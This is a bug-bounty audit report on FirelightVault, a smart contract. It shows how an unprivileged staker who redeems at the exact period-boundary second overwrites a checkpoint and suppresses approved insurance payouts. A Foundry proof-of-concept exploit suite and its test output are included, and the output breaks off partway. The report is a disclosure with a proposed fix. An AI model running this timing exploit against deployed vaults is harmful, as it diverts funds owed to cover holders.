# 89976 sc high period boundary checkpoint overwrite in firelightvault lets an unprivileged staker suppress approved incident payouts and deflate underwriting capacity

**Submitted on Aug 22nd 2026 at 08:37:32 UTC by @Emmy for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89976
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

`FirelightVault.payout()` caps every incident claim at `totalAssetsAt(capturePeriodStart)`, and `CoverOrderAllocator` reads that same historical figure when computing capital adequacy and available capacity. The value is served by a checkpoint library whose `push` overwrites the stored entry whenever the incoming key equals the latest key, and the vault writes a checkpoint at `Time.timestamp()` on every ordinary deposit, withdraw, and redeem. Whichever unprivileged account transacts in the block whose timestamp equals the period start therefore decides what `totalAssetsAt(periodStart)` returns for that entire period. A staker who redeems in that block drives the recorded figure down while the redeemed assets remain classified as payable, and because the payout cap is a `min`, an approved claim is silently paid at the deflated figure. On mainnet this means a cover holder with a fully approved claim receives materially less than the protocol is holding for them, the exiting staker keeps collateral that should have been slashed to fund that claim, and the protocol simultaneously under-reports the capital it will underwrite against for that period.

## Vulnerability Details

### Background: how the exposure cap is supposed to work

Firelight prices incident exposure against the collateral that backed the vault when the covered period opened. `payout()` reads that opening figure through `totalAssetsAt(capturePeriodStart)` and treats it as a ceiling on what any claim for that capture period may draw. Withdrawals requested during the capture period are deliberately kept payable so that a staker cannot dodge a loss by queueing an exit, a protection the contract states explicitly in its own comments.

That design depends on one property: the opening figure for a period must be fixed once the period begins. It is not.

### The checkpoint primitive overwrites on a key collision

`Checkpoints.Trace256` stores values in a side array and keys in an OpenZeppelin trace. When the incoming key matches the latest key it replaces the stored value in place rather than appending (`contracts/core/lib/Checkpoints.sol:198-213`):

```solidity
function push(Trace256 storage self, uint48 key, uint256 value) internal returns (uint256, uint256) {
    if (self._values.length == 0) {
        self._values.push(0);
    }

    (bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();

    uint256 len = self._values.length;
    uint256 lastValue = latest(self);
    if (exists && key == lastKey) {
        self._values[len - 1] = value;      // the last write in that second wins
    } else {
        self._trace.push(key, uint208(len));
        self._values.push(value);
    }

    return (lastValue, value);
}
```

`totalAssetsAt(t)` resolves through `upperLookupRecent(t)`, which returns the value of the latest checkpoint whose key is at most `t`. A checkpoint carrying key exactly `t` is therefore the entry that answers the query, whether it was freshly appended or overwrote an earlier same-second entry. Both branches of `push` produce the same outcome for a query at the boundary second, which is why removing only the overwrite branch would not fix this.

### Every ordinary user action writes that checkpoint

`_logTrace` records the post-operation total at the current block timestamp (`contracts/core/FirelightVault.sol:1044-1055`):

```solidity
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

It is reached from the withdraw and redeem paths at `:741` and `:775`, and from the deposit path at `:991`. None of those paths is role gated. `checkpointTotalAssets()` at `:524-526` writes the same trace with the same key, so an operator snapshot and an ordinary user action collide on equal terms and the later transaction in the block prevails.

### The corrupted value is a hard ceiling on claims

`payout()` computes (`contracts/core/FirelightVault.sol:911-936`):

```solidity
// Cap by the active assets committed at the start of the covered period.
// This is an exposure cap, not a segregated asset bucket.
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();

// Withdrawals requested during the capture period are assigned to capturePeriod + 1
// and remain payable while payout is allowed.
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
...
// otherwise exposed assets could escape by withdrawing first.
...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

Two quantities are computed and the smaller governs. `activePayableAmount` counts the queued withdrawal bucket precisely so that, in the contract's own words, "exposed assets could escape by withdrawing first" cannot happen. `assetsAtCapturePeriod` is supposed to be the independent exposure ceiling. Once a boundary write deflates `assetsAtCapturePeriod`, the `min` binds on the deflated figure and the payout collapses regardless of `activePayableAmount`, even though `activePayableAmount` still contains the very assets that were withdrawn.

The two figures end up contradicting one another. The protocol asserts, in the same function call, that those assets are payable for this capture period and that they do not count toward what may be paid. The pessimistic assertion wins and the claimant absorbs the difference.

### The same value is a capacity input

`CoverOrderAllocator` reads the identical historical figure when sizing available capacity (`contracts/core/CoverOrderAllocator.sol:710-714`):

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

A single unprivileged boundary transaction therefore moves the capital adequacy ratio and the amount of cover the protocol will underwrite for that period, in addition to capping claims.

### Reaching the boundary second

Period boundaries are deterministic and publicly readable through `currentPeriodEnd()`, so the target second is known in advance to anyone.

The corruption occurs in two ways. It occurs **accidentally** whenever any staker's ordinary deposit, withdraw, or redeem happens to be mined in the block whose timestamp equals the period start. No attacker is involved and the protocol receives no signal that the period's exposure cap has been rewritten.

It occurs **deliberately** when a staker aims an exit at that second. Landing in the boundary block is probabilistic per attempt, because not every second carries a block, but the attempt costs only gas, the boundary is publicly computable, and it can be retried at every period.

A third route is deterministic rather than probabilistic, and its availability depends on operational practice rather than on code. If the protocol calls `checkpointTotalAssets()` at a period boundary, a staker who back-runs that call in the same block overwrites the official snapshot through the `key == lastKey` branch with no dependence on timestamp luck. The repository does not schedule such a call: `checkpointTotalAssets()` is invoked only from `VaultRewardDistributor` at `:150` and `:174` after forwarding rewards. That route is therefore noted rather than relied upon, and the project should confirm whether it performs period-start checkpointing operationally. The accidental and probabilistic routes stand on their own.

### Proof that the boundary second is the cause

The strongest objection to this finding is that the redeem simply reduced the assets backing the period, making the lower cap correct. The proof of concept refutes that directly by running the same staker performing the same redeem one second later:

```
    redeem AT periodStart    -> cap 1,000,000 ; claim paid 1,000,000
    redeem periodStart + 1s  -> cap 2,000,000 ; claim paid 1,500,000
```

One second later the anti-escape mechanism behaves exactly as documented: the queued assets are slashed and the claim pays in full. The economic action is identical in both runs. Only the second in which it lands differs, and that alone moves the claim by 500,000 fXRP.

### The shortfall is silent

`payout()` does not revert when it under-pays. It returns a smaller number. `IncidentManager._executePayout` passes that return value to `IncidentManager.sol:432-434`:

```solidity
if (vaultPaidAmount > 0) incident.vaultPaidAmount = vaultPaidAmount;

incident.status = IncidentStatus.CLOSED;
```

`vaultPaidAmount` is recorded and the incident is closed without ever being compared against `vaultRequestedAmount`. There is no shortfall check, no retry, and no revert anywhere on that path. The claim closes short and nothing on chain flags it.

## Impact Details

The demonstrated impact is incorrect payout accounting producing a quantifiable loss to a cover holder, together with an error in the capacity input the allocator underwrites against.

**A fully approved claim is under-paid.** With a 2,000,000 fXRP vault and an approved claim of 1,500,000 fXRP, the honest payout delivers the full 1,500,000 fXRP when no boundary write occurs and only 1,000,000 fXRP when one does. **500,000 fXRP of an approved claim is suppressed, which is 3,333 basis points of the claim and 2,500 basis points of vault TVL.** The loss falls on the cover holder and the configured payout receiver.

**Part of the shortfall is captured by the unprivileged actor.** Measured against the same staker performing the same redeem one second later, the boundary timing leaves them holding 500,000 fXRP instead of 250,000 fXRP, a **gain of 250,000 fXRP**. The remaining 250,000 fXRP stays in the vault and accrues to the other stakers. So the claimant's 500,000 fXRP loss is not destroyed value, it is transferred, and half of it is captured directly by the actor who caused it.

**The suppression scales with the actor's stake.** The deflation equals whatever the staker removes in the boundary block. A staker holding a larger share of the vault suppresses proportionally more, and a sole staker redeeming in full drives `totalAssetsAt(periodStart)` to zero and the claim to zero.

**It is a dominant strategy for anyone exiting.** The staker does not need to predict that an incident will be captured in that period. Aiming an exit at the boundary second costs only gas, applies to withdrawals they were making anyway, and strictly improves their own outcome: if no incident follows, nothing is lost, and if one does, their own slashing is halved. Every ordinary withdrawal therefore carries a standing incentive to corrupt that period's exposure cap.

**It recurs every period.** Across three consecutive boundaries the proof of concept accumulates 1,500,000 fXRP of suppressed claims, at 500,000 fXRP per period. The window reopens at every period boundary for the life of the protocol.

**Underwriting capacity is deflated by the same write.** `totalAssetsAt(currentPeriodStart)` falls from 2,000,000 fXRP to 1,000,000 fXRP after one unprivileged redeem, halving the figure `CoverOrderAllocator.sol:711` consumes for capital adequacy and capacity. This direction is conservative in solvency terms, since the protocol under-sells rather than over-sells cover, so the consequence is forgone underwriting rather than insolvency.

**On recoverability.** The shortfall is not permanent at the vault level. A `PAYOUT_ROLE` holder who notices the short return value can call `vault.payout()` again and top the claimant up, and the proof of concept demonstrates that. This is stated plainly because it bounds the severity. What makes it material anyway is that nothing on chain surfaces the shortfall for anyone to act on: `payout()` does not revert, `IncidentManager` closes the incident without comparing paid against requested, and the closed incident cannot be re-approved. The correction is therefore an out-of-band call sitting outside the incident accounting, and that same route is uncapped, over-delivering the notional when repeated. The remedy depends entirely on off-chain vigilance rather than on any protocol mechanism.

## References

* `contracts/core/lib/Checkpoints.sol:198-213`, `push` and its `key == lastKey` overwrite branch
* `contracts/core/FirelightVault.sol:1044-1055`, `_logTrace` writing the trace at `Time.timestamp()`
* `contracts/core/FirelightVault.sol:741`, `:775`, `:991`, the unprivileged call sites that write it
* `contracts/core/FirelightVault.sol:524-526`, `checkpointTotalAssets`
* `contracts/core/FirelightVault.sol:911-936`, the `payout()` cap and its anti-escape comment
* `contracts/core/FirelightVault.sol:456-458`, `totalAssetsAt`
* `contracts/core/IncidentManager.sol:432-434`, the incident closing without comparing paid to requested
* `contracts/core/IncidentManager.sol:684`, `_executePayout` consuming the vault's return value
* `contracts/core/CoverOrderAllocator.sol:710-714`, the capacity and capital adequacy read
* `contracts/core/VaultRewardDistributor.sol:150`, `:174`, the only scheduled `checkpointTotalAssets` calls
* In-scope commit: `42f9ea5e43d88b35197b901acc2a8c24b314fa62`, branch `v1_audit_ready`

## Proof of Concept

## Proof of Concept

The test exercises the real `FirelightVault` implementation behind a real `ERC1967Proxy`. No Firelight logic is mocked, and the only substituted contract is the external ERC-20 collateral, a plain six-decimal OpenZeppelin `ERC20` standing in for FXRP. There is no `vm.store` anywhere, so every value is produced by real calls. `PAYOUT_ROLE`, `CHECKPOINT_ROLE`, and the admin appear only in setup performing their honest, documented duties, and the actor who triggers the defect is an ordinary staker holding no role.

The suite contains six tests: the main proof, the one-second boundary isolation control, a repeatability run across three boundaries, the shortfall-handling test, the capacity-input test, and a negative control that runs the identical sequence against the in-scope contract with the defect repaired.

### Setup

The repository ships with Hardhat only, so the following adds a self-contained Foundry harness. `src` is scoped to `contracts/core` and `libs` deliberately avoids the repository's existing `./lib` directory, which holds the project's JavaScript helpers. The Hardhat build is unaffected.

```bash
cd repo

# 1. forge-std, kept out of ./lib to avoid colliding with the project's JS helpers
mkdir -p foundry-lib
git clone --depth 1 https://github.com/foundry-rs/forge-std foundry-lib/forge-std

# 2. Foundry configuration
cat > foundry.toml <<'EOF'
[profile.default]
src = "contracts/core"
test = "test-foundry"
out = "out-foundry"
cache_path = "cache-foundry"
libs = ["foundry-lib", "node_modules"]
solc = "0.8.28"
via_ir = true
optimizer = true
optimizer_runs = 800
evm_version = "london"
EOF

cat > remappings.txt <<'EOF'
forge-std/=foundry-lib/forge-std/src/
@openzeppelin/contracts-upgradeable/=node_modules/@openzeppelin/contracts-upgradeable/
@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/
EOF

# 3. Negative control: the in-scope contract with the read moved off the boundary second
mkdir -p test-foundry/fixed
sed -e 's|uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);|uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart - 1); // FIX|' \
    -e 's|import {FirelightVaultStorage} from "./FirelightVaultStorage.sol";|import {FirelightVaultStorage} from "../../contracts/core/FirelightVaultStorage.sol";|' \
    -e 's|import {Checkpoints} from "./lib/Checkpoints.sol";|import {Checkpoints} from "../../contracts/core/lib/Checkpoints.sol";|' \
    -e 's|^contract FirelightVault is|contract FirelightVaultBoundaryFixed is|' \
    contracts/core/FirelightVault.sol > test-foundry/fixed/FirelightVaultBoundaryFixed.sol
```

The generated control differs from the in-scope contract by exactly one line:

```
911c911
<         uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart - 1); // FIX
---
>         uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
```

### Test file

Save as `repo/test-foundry/CheckpointBoundarySuppression.t.sol`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {FirelightVault} from "../contracts/core/FirelightVault.sol";
import {FirelightVaultBoundaryFixed} from "./fixed/FirelightVaultBoundaryFixed.sol";

/// The vault's underlying collateral. This is the EXTERNAL asset only (a plain 6-decimal ERC20
/// standing in for FXRP). No Firelight logic is mocked anywhere in this file.
contract FXRP is ERC20 {
    constructor() ERC20("FAsset XRP", "fXRP") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

/**
 * PoC: an unprivileged period-boundary checkpoint write suppresses a legitimate incident payout.
 *
 * ROOT CAUSE
 *   `Checkpoints.push` (lib/Checkpoints.sol:206) OVERWRITES the stored value when the incoming key
 *   equals the latest key, and `_logTrace` (FirelightVault.sol:1055) writes at `Time.timestamp()`
 *   on every ordinary deposit / withdraw / redeem. Whoever transacts in the block whose timestamp
 *   equals the period start therefore determines what `totalAssetsAt(periodStart)` returns.
 *
 *   `payout()` (FirelightVault.sol:911-936) caps a claim at
 *       paidAmount = min(amount, min(assetsAtCapturePeriod, activePayableAmount))
 *   so deflating `assetsAtCapturePeriod` caps the claim REGARDLESS of `activePayableAmount`, even
 *   though `activePayableAmount` still contains the withdrawn assets in
 *   `withdrawAssets[capturePeriod + 1]`. The contract keeps them there deliberately, per its own
 *   comment: "otherwise exposed assets could escape by withdrawing first".
 *
 * INVARIANT UNDER TEST (INV-3 PAYOUT BOUND, lower-bound form)
 *   An honest, approved payout must be able to draw the assets the protocol itself still classifies
 *   as payable for that capture period. No unprivileged actor may reduce what a legitimate claim
 *   collects.
 *
 * CALLER MODEL
 *   The exploit actor is an ordinary staker holding NO role. PAYOUT_ROLE, CHECKPOINT_ROLE and the
 *   admin appear only in setup performing their honest, documented duties. The defect is that the
 *   honest payout then produces the wrong number.
 */
contract CheckpointBoundarySuppressionPoC is Test {
    uint256 constant ONE = 1e6;                  // 6-decimal asset
    uint48  constant PERIOD = 7 days;

    // Realistic scale: a 2,000,000 fXRP vault, an approved claim of 1,500,000 fXRP.
    uint256 constant STAKE = 1_000_000 * ONE;    // each of two stakers
    uint256 constant TVL   = 2_000_000 * ONE;
    uint256 constant CLAIM = 1_500_000 * ONE;

    FXRP asset;
    uint256 clock = 1_800_000_000;

    address admin     = makeAddr("admin");
    address payoutOp  = makeAddr("payoutOp");    // PAYOUT_ROLE, honest
    address checkptOp = makeAddr("checkptOp");   // CHECKPOINT_ROLE, honest
    address receiver  = makeAddr("receiver");    // approved claim receiver, the loser
    address exiter    = makeAddr("exiter");      // UNPRIVILEGED staker, the exploit actor
    address honest    = makeAddr("honest");      // UNPRIVILEGED staker who does nothing special

    struct Run {
        uint256 paid;
        uint256 capAtStart;
        uint256 payableBucket;
        uint256 exiterKept;
        uint48  periodStart;
        uint256 bucketIdx;
    }

    // ---------------------------------------------------------------- harness

    function _blob() internal view returns (bytes memory) {
        return abi.encode(
            FirelightVault.InitParams({
                defaultAdmin: admin,
                limitUpdater: admin,
                blocklister: admin,
                pauser: admin,
                periodConfigurationUpdater: admin,
                rescuer: admin,
                depositLimit: 100_000_000 * ONE,
                periodConfigurationDuration: PERIOD
            })
        );
    }

    function _grant(address v) internal {
        FirelightVault vault = FirelightVault(v);
        vm.startPrank(admin);
        vault.grantRole(vault.PAYOUT_ROLE(), payoutOp);
        vault.grantRole(vault.CHECKPOINT_ROLE(), checkptOp);
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), admin);
        vault.addToPayoutAllowlist(receiver);
        vm.stopPrank();
    }

    function _deployVault() internal returns (FirelightVault v) {
        asset = new FXRP();
        FirelightVault impl = new FirelightVault();
        ERC1967Proxy p = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(FirelightVault.initialize,
                (IERC20(address(asset)), "stfXRP", "stfXRP", _blob()))
        );
        v = FirelightVault(address(p));
        _grant(address(v));
    }

    function _seed(address v, address who, uint256 amt) internal {
        asset.mint(who, amt);
        vm.startPrank(who);
        asset.approve(v, type(uint256).max);
        FirelightVault(v).deposit(amt, who);
        vm.stopPrank();
    }

    /// mode 0 = no boundary write; 1 = exiter redeems AT the boundary second;
    /// mode 2 = exiter performs the IDENTICAL redeem one second later.
    function _run(uint8 mode) internal returns (Run memory r) {
        clock += 365 days;                       // fresh, always-forward timeline per run
        vm.warp(clock);
        FirelightVault v = _deployVault();

        // ============================== ACT 1: BASELINE ==============================
        _seed(address(v), exiter, STAKE);
        _seed(address(v), honest, STAKE);
        assertEq(v.totalAssets(), TVL, "baseline: vault holds the full TVL");

        r.periodStart = uint48(v.currentPeriodEnd());
        vm.warp(r.periodStart);
        assertEq(v.currentPeriodStart(), r.periodStart, "baseline: exactly at the period boundary");
        assertEq(v.totalAssetsAt(r.periodStart), TVL,
            "INVARIANT HOLDS BEFORE: the period opens with the full TVL recorded");

        // An honest CHECKPOINT_ROLE snapshot of the period-start figure.
        vm.prank(checkptOp);
        v.checkpointTotalAssets();
        assertEq(v.totalAssetsAt(r.periodStart), TVL, "official snapshot records the full TVL");

        // ====================== ACT 2: EXPLOIT, unprivileged only ======================
        if (mode == 2) vm.warp(r.periodStart + 1);      // identical action, one second later
        if (mode != 0) {
            // balance read BEFORE the prank: an intervening call would consume it
            uint256 shares = v.balanceOf(exiter);
            vm.prank(exiter);                            // <-- UNPRIVILEGED
            v.redeem(shares, exiter, exiter);
        }

        r.bucketIdx     = v.currentPeriod() + 1;
        r.capAtStart    = v.totalAssetsAt(r.periodStart);
        r.payableBucket = v.withdrawAssets(r.bucketIdx);

        // ============ an honest, approved claim for an incident captured this period ============
        vm.prank(payoutOp);
        r.paid = v.payout(receiver, CLAIM, r.periodStart);

        // the exiter collects whatever survived the slashing
        vm.warp(block.timestamp + 2 * PERIOD);
        if (mode != 0 && v.withdrawalsOf(r.bucketIdx, exiter) > 0) {
            vm.prank(exiter);
            r.exiterKept = v.claimWithdraw(r.bucketIdx);
        }
    }

    // ---------------------------------------------------------------- ACT 3: the proof

    function test_PoC_boundary_write_suppresses_an_honest_payout() public {
        Run memory ctl = _run(0);
        Run memory exp = _run(1);

        console.log("=== ACT 1  BASELINE ===");
        console.log("  vault TVL at period start        :", TVL);
        console.log("  approved claim                   :", CLAIM);
        console.log("=== CONTROL: no boundary write ===");
        console.log("  totalAssetsAt(periodStart)       :", ctl.capAtStart);
        console.log("  honest payout paid               :", ctl.paid);
        assertEq(ctl.capAtStart, TVL, "control: snapshot intact");
        assertEq(ctl.paid, CLAIM, "control: the approved claim pays in full");

        console.log("=== ACT 2/3  EXPLOIT: one unprivileged redeem at the boundary second ===");
        console.log("  totalAssetsAt(periodStart)       :", exp.capAtStart);
        console.log("  withdrawAssets[capture+1]        :", exp.payableBucket);
        console.log("  honest payout paid               :", exp.paid);

        assertEq(exp.capAtStart, STAKE, "snapshot deflated to the post-redeem figure");
        assertEq(exp.payableBucket, STAKE, "the redeemed assets are STILL classified payable");
        assertLt(exp.paid, ctl.paid, "an unprivileged actor reduced an honest payout");

        // The contradiction, stated numerically: the protocol simultaneously says these assets are
        // payable and refuses to count them toward the cap.
        assertGe(exp.capAtStart + exp.payableBucket, CLAIM,
            "the payable pool alone would have covered the claim");
        assertEq(exp.paid, STAKE, "yet the claim is capped at the deflated snapshot");

        uint256 suppressed = ctl.paid - exp.paid;
        console.log("--- LOSS ---");
        console.log("  suppressed claim (absolute, 6dp) :", suppressed);
        console.log("  as bps of the approved claim     :", (suppressed * 10000) / CLAIM);
        console.log("  as bps of vault TVL              :", (suppressed * 10000) / TVL);
        console.log("  claimant received                :", exp.paid, "of", CLAIM);
        console.log("  exiter kept, control  :", ctl.exiterKept);
        console.log("  exiter kept, exploit  :", exp.exiterKept);

        assertEq(suppressed, 500_000 * ONE, "500,000 fXRP of an approved claim suppressed");
        assertGt(exp.exiterKept, ctl.exiterKept, "the exiter profits from the suppression");
    }

    /// THE DECISIVE CONTROL. The SAME staker performing the SAME redeem one second later leaves the
    /// cap intact and the claim paid in full. This rules out "the redeem legitimately reduced the
    /// assets backing the period" and isolates the boundary second as the cause.
    function test_CONTROL_identical_redeem_one_second_later_pays_in_full() public {
        Run memory atBoundary = _run(1);
        Run memory oneLater   = _run(2);

        console.log("=== BOUNDARY ISOLATION ===");
        console.log("  redeem AT periodStart   -> cap:", atBoundary.capAtStart);
        console.log("                             paid:", atBoundary.paid);
        console.log("  redeem periodStart + 1s -> cap:", oneLater.capAtStart);
        console.log("                             paid:", oneLater.paid);
        console.log("  exiter kept at boundary   :", atBoundary.exiterKept);
        console.log("  exiter kept one sec later :", oneLater.exiterKept);

        assertEq(atBoundary.capAtStart, STAKE, "at the boundary the cap is deflated");
        assertEq(atBoundary.paid, STAKE, "at the boundary the claim is suppressed");
        assertEq(oneLater.capAtStart, TVL, "one second later the cap is intact");
        assertEq(oneLater.paid, CLAIM, "one second later the claim pays in full");

        // Dominant-strategy proof: timing the exit at the boundary strictly benefits the exiter.
        assertGt(atBoundary.exiterKept, oneLater.exiterKept,
            "exiting at the boundary reduces the exiter's own slashing");
        console.log("  one second of timing moves the claim by :", oneLater.paid - atBoundary.paid);
        console.log("  and moves the exiter's own outcome by   :",
            atBoundary.exiterKept - oneLater.exiterKept);
    }

    /// Repeatable at every period boundary; the corruption is not one-shot.
    function test_PoC_repeatable_at_every_period_boundary() public {
        uint256 cumulative;
        for (uint256 i; i < 3; ++i) {
            Run memory c = _run(0);
            Run memory e = _run(1);
            cumulative += (c.paid - e.paid);
        }
        console.log("=== REPEATABILITY ===");
        console.log("  consecutive period boundaries    :", uint256(3));
        console.log("  cumulative suppressed claims     :", cumulative);
        console.log("  per-period suppression           :", cumulative / 3);
        assertEq(cumulative, 3 * 500_000 * ONE, "the suppression recurs every period");
    }

    /// What happens to the shortfall. `payout()` does NOT revert when it under-pays: it simply
    /// returns a smaller number. `IncidentManager._executePayout` passes that return value straight
    /// to `IncidentManager.sol:432-434`, which records it and closes the incident WITHOUT ever
    /// comparing it to `vaultRequestedAmount`. So through the production path the gap is silently
    /// swallowed and the incident is CLOSED. Recovery is possible only by an out-of-band direct
    /// `vault.payout()` re-call, which the incident flow has no mechanism to trigger, and which
    /// over-pays the notional if repeated.
    function test_PoC_shortfall_is_silent_and_needs_out_of_band_recovery() public {
        clock += 365 days;
        vm.warp(clock);
        FirelightVault v = _deployVault();
        _seed(address(v), exiter, STAKE);
        _seed(address(v), honest, STAKE);

        uint48 periodStart = uint48(v.currentPeriodEnd());
        vm.warp(periodStart);

        uint256 shares = v.balanceOf(exiter);
        vm.prank(exiter);
        v.redeem(shares, exiter, exiter);

        // The honest payout does not revert. It silently returns less than was requested.
        vm.prank(payoutOp);
        uint256 first = v.payout(receiver, CLAIM, periodStart);
        uint256 shortfall = CLAIM - first;

        console.log("=== SHORTFALL HANDLING ===");
        console.log("  requested by the approved claim  :", CLAIM);
        console.log("  payout() returned                :", first);
        console.log("  silent shortfall                 :", shortfall);
        assertLt(first, CLAIM, "payout under-pays without reverting");
        assertEq(shortfall, 500_000 * ONE, "the caller is short 500,000 fXRP and is not told");

        // IncidentManager.sol:432-434 records `vaultPaidAmount` and closes the incident without
        // comparing it to `vaultRequestedAmount`, so nothing on that path notices or retries.

        // Out-of-band recovery IS possible at the vault level, but only by a manual re-call.
        vm.prank(payoutOp);
        uint256 topUp = v.payout(receiver, shortfall, periodStart);
        console.log("  [out-of-band] manual re-call paid:", topUp);
        assertGt(topUp, 0, "a direct re-call can top the claimant up");

        // ...and that same re-call mechanism has no aggregate cap, so repeating it over-pays the
        // notional. That over-payment direction is the DECLARED known issue (contest A.6 /
        // Macro TMAAR) and is not claimed here; it is shown only to establish that the recovery
        // route is unbounded rather than a controlled correction.
        vm.warp(periodStart + PERIOD);
        vm.prank(payoutOp);
        uint256 extra = v.payout(receiver, shortfall, periodStart);
        console.log("  [out-of-band] a further re-call  :", extra);
        console.log("  total delivered                  :", first + topUp + extra);
        console.log("  vs an approved claim of          :", CLAIM);
        assertGt(first + topUp + extra, CLAIM, "the manual route is uncapped, not a precise fix");
    }

    /// The same corrupted read feeds CoverOrderAllocator.sol:711 for CAR / capacity.
    function test_PoC_same_write_deflates_the_underwriting_capacity_input() public {
        clock += 365 days;
        vm.warp(clock);
        FirelightVault v = _deployVault();
        _seed(address(v), exiter, STAKE);
        _seed(address(v), honest, STAKE);

        uint48 periodStart = uint48(v.currentPeriodEnd());
        vm.warp(periodStart);

        uint256 capacityBefore = v.totalAssetsAt(v.currentPeriodStart());
        uint256 shares = v.balanceOf(exiter);
        vm.prank(exiter);
        v.redeem(shares, exiter, exiter);
        uint256 capacityAfter = v.totalAssetsAt(v.currentPeriodStart());

        console.log("=== CAPACITY INPUT (CoverOrderAllocator.sol:711) ===");
        console.log("  totalAssetsAt(currentPeriodStart) before:", capacityBefore);
        console.log("  after one unprivileged boundary redeem  :", capacityAfter);
        console.log("  deflated by                             :", capacityBefore - capacityAfter);
        assertEq(capacityBefore, TVL, "capacity input starts at the full vault");
        assertEq(capacityAfter, STAKE, "capacity input halved by one unprivileged tx");
    }

    // ---------------------------------------------------------------- NEGATIVE CONTROL

    /// `FirelightVaultBoundaryFixed` is the in-scope contract with EXACTLY one line changed:
    ///   totalAssetsAt(capturePeriodStart)  ->  totalAssetsAt(capturePeriodStart - 1)
    /// so a checkpoint written AT the boundary second can no longer answer the query. Under the
    /// fix the identical exploit sequence pays the claim in full, which proves this PoC targets
    /// the defect itself and FAILS once it is repaired.
    function test_NEGATIVE_CONTROL_the_fix_restores_the_full_payout() public {
        clock += 365 days;
        vm.warp(clock);

        asset = new FXRP();
        FirelightVaultBoundaryFixed impl = new FirelightVaultBoundaryFixed();
        ERC1967Proxy p = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(FirelightVaultBoundaryFixed.initialize,
                (IERC20(address(asset)), "stfXRP", "stfXRP", _blob()))
        );
        FirelightVaultBoundaryFixed v = FirelightVaultBoundaryFixed(address(p));
        _grant(address(v));

        _seed(address(v), exiter, STAKE);
        _seed(address(v), honest, STAKE);

        uint48 periodStart = uint48(v.currentPeriodEnd());
        vm.warp(periodStart);
        vm.prank(checkptOp);
        v.checkpointTotalAssets();

        // the identical unprivileged boundary redeem
        uint256 shares = v.balanceOf(exiter);
        vm.prank(exiter);
        v.redeem(shares, exiter, exiter);

        vm.prank(payoutOp);
        uint256 paid = v.payout(receiver, CLAIM, periodStart);

        console.log("=== NEGATIVE CONTROL (one line fixed) ===");
        console.log("  identical boundary redeem, claim paid:", paid);
        console.log("  of an approved claim of              :", CLAIM);
        assertEq(paid, CLAIM, "with the fix the approved claim pays in full despite the boundary redeem");
        assertEq(asset.balanceOf(receiver), CLAIM, "claimant actually received the full amount");
    }
}
```

### Command

```bash
cd repo && forge test --match-path "test-foundry/CheckpointBoundarySuppression.t.sol" -vv
```

### Output

```
Ran 6 tests for test-foundry/CheckpointBoundarySuppression.t.sol:CheckpointBoundarySuppressionPoC
[PASS] test_CONTROL_identical_redeem_one_second_later_pays_in_full() (gas: 13784774)
Logs:
  === BOUNDARY ISOLATION ===
    redeem AT periodStart   -> cap: 1000000000000
                               paid: 1000000000000
    redeem periodStart + 1s -> cap: 2000000000000
                               paid: 1500000000000
    exiter kept at boundary   : 500000000000
    exiter kept one sec later : 250000000000
    one second of timing moves the claim by : 500000000000
    and moves the exiter's own outcome by   : 250000000000

[PASS] test_NEGATIVE_CONTROL_the_fix_restores_the_full_payout() (gas: 6827789)
Logs:
  === NEGATIVE CONTROL (one line fixed) ===
    identical boundary redeem, claim paid: 1500000000000
    of an approved claim of              : 1500000000000

[PASS] test_PoC_boundary_write_suppresses_an_honest_payout() (gas: 13546625)
Logs:
  === ACT 1  BASELINE ===
    vault TVL at period start        : 2000000000000
    approved claim                   : 1500000000000
  === CONTROL: no boundary write ===
    totalAssetsAt(periodStart)       : 2000000000000
    honest payout paid               : 1500000000000
  === ACT 2/3  EXPLOIT: one unprivileged redeem at the boundary second ===
    totalAssetsAt(periodStart)       : 1000000000000
    withdrawAssets[capture+1]        : 1000000000000
    honest payout paid               : 1000000000000
  --- LOSS ---
    suppressed claim (absolute, 6dp) : 500000000000
    as bps of the approved claim     : 3333
    as bps of vault TVL              : 2500
    claimant received                : 1000000000000 of 1500000000000
    exiter kept, control  : 0
    exiter kept, exploit  : 500000000000

[PASS] test_PoC_repeatable_at_every_period_boundary() (gas: 40536739)
Logs:
  === REPEATABILITY ===
    consecutive period boundaries    : 3
    cumulative suppressed claims     : 1500000000000
    per-period suppression           : 500000000000

[PASS] test_PoC_same_write_deflates_the_underwriting_capacity_input() (gas: 6787940)
Logs:
  === CAPACITY INPUT (CoverOrderAllocator.sol:711) ===
    totalAssetsAt(currentPeriodStart) before: 2000000000000
    after one unprivileged boundary redeem  : 1000000000000
    deflated by                             : 1000000000000

[PASS] test_PoC_shortfall_is_silent_and_needs_out_of_band_recovery() (gas: 6904717)
Logs:
  === SHORTFALL HANDLING ===
